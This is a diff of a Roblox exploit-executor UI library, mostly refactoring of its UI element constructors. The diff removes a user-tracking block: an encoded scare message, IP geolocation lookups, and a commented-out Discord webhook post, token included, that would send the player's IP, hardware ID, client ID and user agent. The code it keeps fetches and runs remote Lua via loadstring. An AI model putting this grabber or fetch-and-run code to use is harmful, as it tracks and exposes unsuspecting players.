@@ -1,38 +1,12 @@
-hookfunction(getnamecallmethod, function()
-  return;
-end);
-if (isfunctionhooked(request) or not isfunctionhooked(getnamecallmethod)) then
-  return print("\65\32\112\105\99\116\117\114\101\32\116\97\107\101\110\32\102\114\111\109\32\121\111\117\114\32\119\101\98\99\97\109\58\10\32\32\32\32\32\32\32\44\32\32\32\32\32\32\32\32\32\32\32\32\95\46\46\46\95\32\32\32\32\32\32\32\32\32\32\32\32\44\10\32\32\32\32\32\32\123\39\46\32\32\32\32\32\32\32\32\32\46\39\32\32\32\32\32\39\46\32\32\32\32\32\32\32\32\32\46\39\125\10\32\32\32\32\32\123\32\126\32\39\46\32\32\32\32\32\32\95\124\61\32\32\32\32\95\95\124\95\32\32\32\32\32\32\46\39\32\32\126\125\10\32\32\32\32\123\32\126\32\32\126\32\39\45\46\95\32\40\95\95\95\95\95\95\95\95\95\95\95\41\32\95\46\45\39\126\32\32\126\32\32\125\10\32\32\32\123\126\32\32\126\32\32\126\32\32\32\126\46\39\32\32\32\32\32\32\32\32\32\32\32\39\46\32\126\32\32\32\32\126\32\32\32\32\125\10\32\32\123\32\32\126\32\32\32\126\32\32\126\32\47\32\32\32\47\92\32\32\32\32\32\47\92\32\32\32\92\32\32\32\126\32\32\32\32\126\32\32\125\10\32\32\123\32\32\32\126\32\32\32\126\32\32\47\32\32\32\32\95\95\32\32\32\32\32\95\95\32\32\32\32\92\32\126\32\32\32\126\32\32\32\32\125\10\32\32\32\123\32\32\32\126\32\32\47\92\47\32\32\45\60\40\32\111\41\32\32\32\40\32\111\41\62\45\32\32\92\47\92\32\126\32\32\32\126\125\10\32\32\32\32\123\32\126\32\32\32\59\40\32\32\32\32\32\32\92\47\32\46\45\46\32\92\47\32\32\32\32\32\32\41\59\32\32\32\126\32\125\10\32\32\32\32\32\123\32\126\32\126\92\95\32\32\40\41\32\32\94\32\40\32\32\32\41\32\94\32\32\40\41\32\32\95\47\32\126\32\32\125\10\32\32\32\32\32\32\39\45\46\95\126\32\92\32\32\32\40\96\45\46\95\39\45\39\95\46\45\39\41\32\32\32\47\32\126\95\46\45\39\10\32\32\32\32\32\32\32\32\32\32\39\45\45\92\32\32\32\96\39\46\95\39\34\39\95\46\39\96\32\32\32\47\45\45\39\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\92\32\32\32\32\32\92\96\45\39\47\32\32\32\32\32\47\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\96\92\32\32\32\32\39\45\39\32\32\32\32\47\39\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\96\92\32\32\32\32\32\32\32\32\32\47\39\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\39\39\45\46\46\46\45\39\39\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\72\97\110\100\115\32\85\112\32\83\107\105\100\10");
-end
-local HttpService = game:GetService("HttpService");
-local Players = game:GetService("Players");
-local LocalPlayer = Players.LocalPlayer;
-local function GetJson(v)
-  return HttpService:JSONDecode(request({Url=v}).Body);
-end
-local function GetIP()
-  local IP = GetJson("https://2025.ipchaxun.com").ip;
-  local Url = "https://cz88.net/api/cz88/ip/accurate?ip=" .. IP;
-  local Json = GetJson(Url).data.locations;
-  if (#Json == 0) then
-    return "[" .. IP .. "](" .. Url .. ")";
-  end
-  for i, v in pairs(Json) do
-    Json[i] = v.longitude .. "," .. v.latitude;
-  end
-  return "[" .. IP .. "](https://uri.amap.com/marker?markers=" .. table.concat(Json, "|") .. ")";
-end
-if not _G.Skip then
-  _G.Skip = true;
-  --task.spawn(function() request({Url="https://discord.com/api/webhooks/1340400151319154859/l7zq_0XfyuRzdc2iaRkLSNDEq9uL2G9zCYwRlcr6CnwWeIMkDYKK2m2ZvQBBp7CUa__C",Method="POST",Headers={["Content-Type"]="application/json"},Body=HttpService:JSONEncode({username=LocalPlayer.DisplayName,avatar_url=GetJson("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. LocalPlayer.UserId .. "&size=420x420&format=Png").data[1].imageUrl,embeds={{color=65280,fields={{name="Game",value=("[" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "](https://www.roblox.com/games/" .. game.PlaceId .. ")")},{name="User",value=("[" .. LocalPlayer.Name .. "](https://www.roblox.com/users/" .. LocalPlayer.UserId .. ")")},{name="IP",value=GetIP()},{name="UA",value=HttpService:GetUserAgent()},{name="ClientId",value=game:GetService("RbxAnalyticsService"):GetClientId()},{name="JobId",value=game.JobId},{name="Hwid",value=(gethwid or (function() for i, v in pairs(GetJson("https://httpbin.org/get").headers) do if string.find(i, "Fingerprint") then return v; end end end))()},{name="Executor",value=getexecutorname()}}}}})}); end);
-end
 local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}end return a.cache[b].c end}do function a.a()
   local b=game:GetService"RunService"
   local c=b.Heartbeat
   local d=game:GetService"UserInputService"
   local e=game:GetService"TweenService"
+
   local f=loadstring(game:HttpGetAsync"https://raw.githubusercontent.com/Footagesus/Icons/main/Main.lua")()
   f.SetIconsType"lucide"
+
   local g={
     Font="rbxassetid://12187365364",
     CanDraggable=true,
@@ -106,51 +80,71 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       Grey="#484848",
     }
   }
+
   function g.Init(h)
     g.WindUI=h
   end
+
+
   function g.AddSignal(h,i)
     table.insert(g.Signals,h:Connect(i))
   end
+
   function g.DisconnectAll()
     for h,i in next,g.Signals do
       local j=table.remove(g.Signals,h)
       j:Disconnect()
     end
   end
+
+
   function g.SafeCallback(h,...)
     if not h then
       return
     end
+
     local i,j=pcall(h,...)
     if not i then local
       k, l=j:find":%d+: "
+
+
       warn("[ WindUI: DEBUG Mode ] "..j)
-      return g.WindUI:Notify("DEBUG Mode: Error", not l and j or j:sub(l+1), 8)
+
+      return g.WindUI:Notify{
+        Title="DEBUG Mode: Error",
+        Content=not l and j or j:sub(l+1),
+        Duration=8,
+      }
     end
   end
+
   function g.SetTheme(h)
     g.Theme=h
     g.UpdateTheme(nil,true)
   end
+
   function g.AddFontObject(h)
     table.insert(g.FontObjects,h)
     g.UpdateFont(g.Font)
   end
+
   function g.UpdateFont(h)
     g.Font=h
     for i,j in next,g.FontObjects do
       j.FontFace=Font.new(h,j.FontFace.Weight,j.FontFace.Style)
     end
   end
+
   function g.GetThemeProperty(h,i)
     return i[h]or g.Themes.Dark[h]
   end
+
   function g.AddThemeObject(h,i)
     g.Objects[h]={Object=h,Properties=i}
     g.UpdateTheme(h,false)
     return h
   end
+
   function g.UpdateTheme(h,i)
     local function ApplyTheme(j)
       for k,l in pairs(j.Properties or{})do
@@ -164,6 +158,7 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         end
       end
     end
+
     if h then
       local j=g.Objects[h]
       if j then
@@ -175,22 +170,28 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       end
     end
   end
+
   function g.Icon(h)
     return f.Icon(h)
   end
+
   function g.New(h,i,j)
     local k=Instance.new(h)
+
     for l,m in next,g.DefaultProperties[h]or{}do
       k[l]=m
     end
+
     for n,o in next,i or{}do
       if n~="ThemeTag"then
         k[n]=o
       end
     end
+
     for p,q in next,j or{}do
       q.Parent=k
     end
+
     if i and i.ThemeTag then
       g.AddThemeObject(k,i.ThemeTag)
     end
@@ -199,44 +200,70 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
     end
     return k
   end
+
   function g.Tween(h,i,j,...)
     return e:Create(h,TweenInfo.new(i,...),j)
   end
+
   function g.NewRoundFrame(h,i,j,k,n)
+
+
+
+
+
+
     local o=g.New(n and"ImageButton"or"ImageLabel",{
-      Image=i=="Squircle"and"rbxassetid://80999662900595" or i=="SquircleOutline"and"rbxassetid://117788349049947" or i=="SquircleOutline2"and"rbxassetid://117817408534198" or i=="Shadow-sm"and"rbxassetid://84825982946844" or i=="Squircle-TL-TR"and"rbxassetid://73569156276236",
+      Image=i=="Squircle"and"rbxassetid://80999662900595"
+      or i=="SquircleOutline"and"rbxassetid://117788349049947"
+      or i=="SquircleOutline2"and"rbxassetid://117817408534198"
+      or i=="Shadow-sm"and"rbxassetid://84825982946844"
+      or i=="Squircle-TL-TR"and"rbxassetid://73569156276236",
       ScaleType="Slice",
-      SliceCenter=i~="Shadow-sm"and Rect.new(256,256,256,256)or Rect.new(512,512,512,512),
+      SliceCenter=i~="Shadow-sm"and Rect.new(256
+      ,256
+      ,256
+      ,256
+
+      )or Rect.new(512,512,512,512),
       SliceScale=1,
       BackgroundTransparency=1,
       ThemeTag=j.ThemeTag and j.ThemeTag
     },k)
+
     for p,q in pairs(j or{})do
       if p~="ThemeTag"then
         o[p]=q
       end
     end
+
     local function UpdateSliceScale(r)
       local s=i~="Shadow-sm"and(r/(256))or(r/512)
       o.SliceScale=s
     end
+
     UpdateSliceScale(h)
+
     return o
   end
-  local h=g.New
-  local i=g.Tween
+
+  local h=g.New local i=
+  g.Tween
+
   function g.SetDraggable(j)
     g.CanDraggable=j
   end
+
   function g.Drag(j,k,n)
     local o
     local p,q,r,s
     local t={
       CanDraggable=true
     }
+
     if not k or type(k)~="table"then
       k={j}
     end
+
     local function update(u)
       local v=u.Position-r
       g.Tween(j,0.02,{Position=UDim2.new(
@@ -244,6 +271,7 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         s.Y.Scale,s.Y.Offset+v.Y
         )}):Play()
     end
+
     for u,v in pairs(k)do
       v.InputBegan:Connect(function(w)
         if(w.UserInputType==Enum.UserInputType.MouseButton1 or w.UserInputType==Enum.UserInputType.Touch)and t.CanDraggable then
@@ -252,13 +280,16 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
             p=true
             r=w.Position
             s=j.Position
+
             if n and type(n)=="function"then
               n(true,o)
             end
+
             w.Changed:Connect(function()
               if w.UserInputState==Enum.UserInputState.End then
                 p=false
                 o=nil
+
                 if n and type(n)=="function"then
                   n(false,o)
                 end
@@ -267,6 +298,7 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
           end
         end
       end)
+
       v.InputChanged:Connect(function(w)
         if o==v and p then
           if w.UserInputType==Enum.UserInputType.MouseMovement or w.UserInputType==Enum.UserInputType.Touch then
@@ -275,6 +307,7 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         end
       end)
     end
+
     d.InputChanged:Connect(function(w)
       if w==q and p and o~=nil then
         if t.CanDraggable then
@@ -282,28 +315,36 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         end
       end
     end)
+
     function t.Set(w,x)
       t.CanDraggable=x
     end
+
     return t
   end
+
   function g.Image(j,k,n,o,p,q,r)
     local function SanitizeFilename(s)
       s=s:gsub("[%s/\\:*?\"<>|]+","-")
       s=s:gsub("[^%w%-_%.]","")
       return s
     end
+
     o=o or"Temp"
     k=SanitizeFilename(k)
+
     local s=h("Frame",{
       Size=UDim2.new(0,0,0,0),
+
       BackgroundTransparency=1,
     },{
       h("ImageLabel",{
         Size=UDim2.new(1,0,1,0),
         BackgroundTransparency=1,
         ScaleType="Crop",
-        ThemeTag=(g.Icon(j)or r)and{ImageColor3=q and"Icon"}or nil,
+        ThemeTag=(g.Icon(j)or r)and{
+          ImageColor3=q and"Icon"
+        }or nil,
       },{
         h("UICorner",{
           CornerRadius=UDim.new(0,n)
@@ -324,6 +365,7 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
               Url=j,
               Method="GET",
             }.Body
+
             writefile(t,u)
           end
           s.ImageLabel.Image=getcustomasset(t)
@@ -331,13 +373,16 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       end)
       if not u then
         warn("[ WindUI.Creator ]  '"..identifyexecutor().."' doesnt support the URL Images. Error: "..v)
+
         s:Destroy()
       end
      elseif string.find(j,"rbxassetid")then
       s.ImageLabel.Image=j
     end
+
     return s
   end
+
   return g end function a.b()
   return{
     Dark={
@@ -482,7 +527,11 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         Name="Squircle",
         ImageTransparency=j=="Primary"and 0 or j=="White"and 0 or 1
       }),
+
       d.NewRoundFrame(p,"Squircle",{
+
+
+
         ImageColor3=Color3.new(1,1,1),
         Size=UDim2.new(1,0,1,0),
         Name="Special",
@@ -657,13 +706,26 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         })
       })
     })
+
+
+
+
+
+
+
+
+
+
     d.AddSignal(q.FocusLost,function()
       if k then
         d.SafeCallback(k,q.Text)
       end
     end)
+
     return r
   end
+
+
   return b end function a.e()
   local b=a.load'a'
   local d=b.New
@@ -738,7 +800,15 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       },
       ZIndex=9999,
     },{
+
+
+
+
+
       h.UIElements.Main,
+
+
+
       b.NewRoundFrame(h.UICorner,"SquircleOutline2",{
         Size=UDim2.new(1,0,1,0),
         ImageTransparency=.85,
@@ -1109,16 +1179,16 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
     return h
   end
 
-  function f.New(Title, Content, Duration, Icon, Buttons)
+  function f.New(g)
     local h={
-      Title=Title or"Notification",
-      Content=Content or nil,
-      Icon=Icon or nil,
-      IconThemed=false,
-      Background=nil,
-      BackgroundImageTransparency=0,
-      Duration=Duration or 5,
-      Buttons=Buttons or{},
+      Title=g.Title or"Notification",
+      Content=g.Content or nil,
+      Icon=g.Icon or nil,
+      IconThemed=g.IconThemed,
+      Background=g.Background,
+      BackgroundImageTransparency=g.BackgroundImageTransparency,
+      Duration=g.Duration or 5,
+      Buttons=g.Buttons or{},
       CanClose=true,
       UIElements={},
       Closed=false,
@@ -1140,12 +1210,44 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       Transparency=1,
       Thickness=.6,
     })
+
     local k
+
     if h.Icon then
-      k=b.Image(h.Icon,h.Title..":"..h.Icon,0,g.Window,"Notification",h.IconThemed)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+      k=b.Image(
+      h.Icon,
+      h.Title..":"..h.Icon,
+      0,
+      g.Window,
+      "Notification",
+      h.IconThemed
+      )
       k.Size=UDim2.new(0,26,0,26)
       k.Position=UDim2.new(0,f.UIPadding,0,f.UIPadding)
+
     end
+
     local n
     if h.CanClose then
       n=d("ImageButton",{
@@ -1169,13 +1271,16 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         })
       })
     end
+
     local o=d("Frame",{
       Size=UDim2.new(1,0,0,3),
       BackgroundTransparency=.9,
       ThemeTag={
         BackgroundColor3="Text",
       },
+
     })
+
     local p=d("Frame",{
       Size=UDim2.new(1,
       h.Icon and-28-f.UIPadding or 0,
@@ -1332,7 +1437,11 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
 
     j.UIElements.Main.AutomaticSize="Y"
     j.UIElements.Main.Size=UDim2.new(0,n,0,0)
+
+
+
     local o
+
     if h.Icon then
       o=d.Image(
       h.Icon,
@@ -1477,7 +1586,10 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
     for w,x in next,h.Buttons do
       v(x.Title,x.Icon,x.Callback,x.Variant,t,j)
     end
+
     j:Open()
+
+
     return h
   end
 
@@ -1485,7 +1597,8 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
   local b={}
 
   local d=a.load'a'
-  local e=d.New local f=d.Tween
+  local e=d.New local f=
+  d.Tween
 
 
   function b.New(g,h,i)
@@ -1889,15 +2002,10 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
           end)
         end
       end
-
     end
-
-
     d.Configs[f]=g
-
     return g
   end
-
   function d.AllConfigs(e)
     if listfiles then
       local f={}
@@ -2006,7 +2114,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
             FillDirection="Horizontal",
             VerticalAlignment="Center"
           }),
-
           j,
           e("UIPadding",{
             PaddingTop=UDim.new(0,12),
@@ -2025,37 +2132,29 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       }),
     })
     i.Container=n
-
     function i.Open(o)
       n.Visible=true
-
       f(n,.16,{GroupTransparency=0},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
       f(k,.18,{Scale=1},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
     end
-
     function i.Close(o)
       f(n,.2,{GroupTransparency=1},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
       f(k,.2,{Scale=.9},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
-
       task.wait(.25)
-
       n.Visible=false
       n:Destroy()
     end
-
     return i
   end
-
-
-  return b end function a.m()
+  return b
+end
+function a.m()
   local b=a.load'a'
   local d=b.New
   local e=b.NewRoundFrame
   local f=b.Tween
 
   game:GetService"UserInputService"
-
-
   return function(g)
     local h={
       Title=g.Title,
@@ -2077,10 +2176,7 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
     local i=h.ImageSize
     local j=h.ThumbnailSize
     local k=true
-
-
     local n=0
-
     local o
     local p
     if h.Thumbnail then
@@ -2194,9 +2290,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       Size=UDim2.new(1,0,0,50),
       AutomaticSize="Y",
       ImageTransparency=h.Color and.1 or.95,
-
-
-
       Parent=g.Parent,
       ThemeTag={
         ImageColor3=not h.Color and"Text"or nil
@@ -2252,19 +2345,21 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       h.UIElements.Locked.Visible=false
     end
     return h
-  end end function a.n()
+  end
+end
+function a.n()
   local b=a.load'a'
   local d=b.New
 
   local e={}
 
-  function e.New(f, Title, Callback)
+  function e.New(f,g)
     local h={
       __type="Button",
-      Title=Title or"Button",
-      Desc=nil,
-      Locked=false,
-      Callback=Callback or function()end,
+      Title=g.Title or"Button",
+      Desc=g.Desc or nil,
+      Locked=g.Locked or false,
+      Callback=g.Callback or function()end,
       UIElements={}
     }
     local i=true
@@ -2314,15 +2409,13 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
     end)
     return h.__type,h
   end
-
-  return e end function a.o()
+  return e
+end
+function a.o()
   local b={}
-
   local d=a.load'a'
   local e=d.New
   local f=d.Tween
-
-
   function b.New(g,h,i,j)
     local k={}
     local n=13
@@ -2371,8 +2464,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
           }
         })
       }),
-
-
       d.NewRoundFrame(n,"Squircle",{
         Size=UDim2.new(0,18,0,18),
         Position=UDim2.new(0,3,0.5,0),
@@ -2384,12 +2475,10 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         o,
       })
     })
-
     function k.Set(q,r)
       if r then
         f(p.Frame,0.1,{
           Position=UDim2.new(1,-22,0.5,0),
-
         },Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
         f(p.Layer,0.1,{
           ImageTransparency=0,
@@ -2414,40 +2503,30 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         f(p.Stroke,0.1,{
           ImageTransparency=1,
         }):Play()
-
         if o then
           f(o,0.1,{
             ImageTransparency=1,
           }):Play()
         end
       end
-
       task.spawn(function()
         if j then
           d.SafeCallback(j,r)
         end
       end)
-
-
     end
-
     return p,k
   end
-
-
-  return b end function a.p()
+  return b
+end
+function a.p()
   local b={}
-
   local d=a.load'a'
   local e=d.New
   local f=d.Tween
-
-
   function b.New(g,h,i,j)
     local k={}
-
     h=h or"check"
-
     local n=10
     local o=e("ImageLabel",{
       Size=UDim2.new(1,-10,1,-10),
@@ -2460,7 +2539,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       ImageTransparency=1,
       ImageColor3=Color3.new(1,1,1),
     })
-
     local p=d.NewRoundFrame(n,"Squircle",{
       ImageTransparency=.95,
       ThemeTag={
@@ -2491,10 +2569,8 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
           }
         })
       }),
-
       o,
     })
-
     function k.Set(q,r)
       if r then
         f(p.Layer,0.06,{
@@ -2517,37 +2593,32 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
           ImageTransparency=1,
         }):Play()
       end
-
       task.spawn(function()
         if j then
           d.SafeCallback(j,r)
         end
       end)
     end
-
     return p,k
   end
-
-
-  return b end function a.q()
+  return b
+end
+function a.q()
   local b=a.load'a'local d=
   b.New local e=
   b.Tween
-
   local f=a.load'o'.New
   local g=a.load'p'.New
-
   local h={}
-
-  function h.New(i, Title, Value, Callback)
+  function h.New(i,j)
     local k={
       __type="Toggle",
-      Title=Title or"Toggle",
-      Desc=nil,
-      Value=Value,
-      Icon=nil,
-      Type="Toggle",
-      Callback=Callback or function()end,
+      Title=j.Title or"Toggle",
+      Desc=j.Desc or nil,
+      Value=j.Value,
+      Icon=j.Icon or nil,
+      Type=j.Type or"Toggle",
+      Callback=j.Callback or function()end,
       UIElements={}
     }
     k.ToggleFrame=a.load'm'{
@@ -2558,9 +2629,7 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       TextOffset=44,
       Hover=false,
     }
-
     local n=true
-
     if k.Value==nil then
       k.Value=false
     end
@@ -2572,13 +2641,10 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       n=true
       return k.ToggleFrame:Unlock()
     end
-
     if k.Locked then
       k:Lock()
     end
-
     local o=k.Value
-
     local p,q
     if k.Type=="Toggle"then
       p,q=f(o,k.Icon,k.ToggleFrame.UIElements.Main,k.Callback)
@@ -2617,15 +2683,15 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
 
   local h=false
 
-  function g.New(i, Title, Min, Max, De, Callback)
+  function g.New(i,j)
     local k={
       __type="Slider",
-      Title=Title or"Slider",
-      Desc=nil,
-      Locked=nil,
-      Value={Min = Min, Max = Max, Default = De},
-      Step=1,
-      Callback=Callback or function()end,
+      Title=j.Title or"Slider",
+      Desc=j.Desc or nil,
+      Locked=j.Locked or nil,
+      Value=j.Value or{},
+      Step=j.Step or 1,
+      Callback=j.Callback or function()end,
       UIElements={},
       IsFocusing=false,
     }
@@ -2811,15 +2877,15 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
 
   local i=a.load'i'.New
 
-  function h.New(j, Title, Value, Callback)
+  function h.New(j,k)
     local n={
       __type="Keybind",
-      Title=Title or"Keybind",
-      Desc=nil,
-      Locked=false,
-      Value=Value or"F",
-      Callback=Callback or function()end,
-      CanChange=true,
+      Title=k.Title or"Keybind",
+      Desc=k.Desc or nil,
+      Locked=k.Locked or false,
+      Value=k.Value or"F",
+      Callback=k.Callback or function()end,
+      CanChange=k.CanChange or true,
       Picking=false,
       UIElements={},
     }
@@ -2844,12 +2910,10 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
     )
     n.UIElements.Keybind.AnchorPoint=Vector2.new(1,0.5)
     n.UIElements.Keybind.Position=UDim2.new(1,0,0.5,0)
-
     f("UIScale",{
       Parent=n.UIElements.Keybind,
       Scale=.85,
     })
-
     e.AddSignal(n.UIElements.Keybind.Frame.Frame.TextLabel:GetPropertyChangedSignal"TextBounds",function()
       n.UIElements.Keybind.Size=UDim2.new(
       0,24
@@ -2858,7 +2922,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       42
       )
     end)
-
     function n.Lock(p)
       o=false
       return n.KeybindFrame:Lock()
@@ -2867,28 +2930,22 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       o=true
       return n.KeybindFrame:Unlock()
     end
-
     function n.Set(p,q)
       n.Value=q
       n.UIElements.Keybind.Frame.Frame.TextLabel.Text=q
     end
-
     if n.Locked then
       n:Lock()
     end
-
     e.AddSignal(n.KeybindFrame.UIElements.Main.MouseButton1Click,function()
       if o then
         if n.CanChange then
           n.Picking=true
           n.UIElements.Keybind.Frame.Frame.TextLabel.Text="..."
-
           task.wait(0.2)
-
           local p
           p=b.InputBegan:Connect(function(q)
             local r
-
             if q.UserInputType==Enum.UserInputType.Keyboard then
               r=q.KeyCode.Name
              elseif q.UserInputType==Enum.UserInputType.MouseButton1 then
@@ -2896,15 +2953,12 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
              elseif q.UserInputType==Enum.UserInputType.MouseButton2 then
               r="MouseRight"
             end
-
             local s
             s=b.InputEnded:Connect(function(t)
               if t.KeyCode.Name==r or r=="MouseLeft"and t.UserInputType==Enum.UserInputType.MouseButton1 or r=="MouseRight"and t.UserInputType==Enum.UserInputType.MouseButton2 then
                 n.Picking=false
-
                 n.UIElements.Keybind.Frame.Frame.TextLabel.Text=r
                 n.Value=r
-
                 p:Disconnect()
                 s:Disconnect()
               end
@@ -2922,38 +2976,34 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
     end)
     return n.__type,n
   end
-
-  return h end function a.t()
+  return h
+end
+function a.t()
   local b=a.load'a'
-  local e=b.New local f=
-  b.Tween
-
+  local e=b.New
+  local f=b.Tween
   local g={
     UICorner=8,
     UIPadding=8,
-  }local h=a.load'c'
-
-
+  }
+  local h=a.load'c'
   .New
   local i=a.load'd'.New
-
-  function g.New(j, Title, Callback)
+  function g.New(j,k)
     local n={
       __type="Input",
-      Title=Title or"Input",
-      Desc=nil,
-      Type="Input",
-      Locked=false,
-      InputIcon=false,
-      Placeholder="请输入...",
-      Value="",
-      Callback=Callback or function()end,
-      ClearTextOnFocus=false,
+      Title=k.Title or"Input",
+      Desc=k.Desc or nil,
+      Type=k.Type or"Input",
+      Locked=k.Locked or false,
+      InputIcon=k.InputIcon or false,
+      Placeholder=k.Placeholder or"Enter Text...",
+      Value=k.Value or"",
+      Callback=k.Callback or function()end,
+      ClearTextOnFocus=k.ClearTextOnFocus or false,
       UIElements={},
     }
-
     local o=true
-
     n.InputFrame=a.load'm'{
       Title=n.Title,
       Desc=n.Desc,
@@ -2961,17 +3011,14 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       TextOffset=0,
       Hover=false,
     }
-
     local p=i(n.Placeholder,n.InputIcon,n.InputFrame.UIElements.Container,n.Type,function(p)
       n:Set(p)
     end)
     p.Size=UDim2.new(1,0,0,n.Type=="Input"and 42 or 148)
-
     e("UIScale",{
       Parent=p,
       Scale=1,
     })
-
     function n.Lock(q)
       o=false
       return n.InputFrame:Lock()
@@ -2980,12 +3027,9 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       o=true
       return n.InputFrame:Unlock()
     end
-
-
     function n.Set(q,r)
       if o then
         b.SafeCallback(n.Callback,r)
-
         p.Frame.Frame.TextBox.Text=r
         n.Value=r
       end
@@ -2994,27 +3038,22 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       p.Frame.Frame.TextBox.PlaceholderText=r
       n.Placeholder=r
     end
-
     n:Set(n.Value)
-
     if n.Locked then
       n:Lock()
     end
-
     return n.__type,n
   end
-
-  return g end function a.u()
+  return g
+end
+function a.u()
   local b=game:GetService"UserInputService"
   local e=game:GetService"Players".LocalPlayer:GetMouse()
   local g=game:GetService"Workspace".CurrentCamera
-
   local h=a.load'a'
   local i=h.New
   local j=h.Tween
-
   local k=a.load'i'.New
-
   local n={
     UICorner=10,
     UIPadding=12,
@@ -3022,7 +3061,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
     MenuPadding=5,
     TabPadding=6,
   }
-
   function n.New(o,p)
     local q={
       __type="Dropdown",
@@ -3034,19 +3072,14 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       AllowNone=p.AllowNone,
       Multi=p.Multi,
       Callback=p.Callback or function()end,
-
       UIElements={},
-
       Opened=false,
       Tabs={}
     }
-
     if q.Multi and not q.Value then
       q.Value={}
     end
-
     local r=true
-
     q.DropdownFrame=a.load'm'{
       Title=q.Title,
       Desc=q.Desc,
@@ -3054,20 +3087,10 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       TextOffset=0,
       Hover=false,
     }
-
-
     q.UIElements.Dropdown=k("",nil,q.DropdownFrame.UIElements.Container)
-
     q.UIElements.Dropdown.Frame.Frame.TextLabel.TextTruncate="AtEnd"
     q.UIElements.Dropdown.Frame.Frame.TextLabel.Size=UDim2.new(1,q.UIElements.Dropdown.Frame.Frame.TextLabel.Size.X.Offset-18-12-12,0,0)
-
     q.UIElements.Dropdown.Size=UDim2.new(1,0,0,40)
-
-
-
-
-
-
     i("ImageLabel",{
       Image=h.Icon"chevrons-up-down"[1],
       ImageRectOffset=h.Icon"chevrons-up-down"[2].ImageRectPosition,
@@ -3123,7 +3146,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         })
       })
